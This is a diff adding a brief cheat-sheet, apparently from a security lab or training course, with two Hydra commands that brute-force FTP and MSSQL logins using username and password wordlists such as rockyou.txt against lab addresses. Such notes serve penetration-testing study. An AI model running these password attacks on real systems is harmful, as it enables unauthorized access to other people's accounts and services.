@@ -1,0 +1,11 @@
+Hydra 
+___________
+
+=> Brute-Forcing of ftp / ssh password / usernames
+=====================================================
+$ hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11]
+
+=> To brute force the MSSQL service password
+=====================================================
+$ hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
+
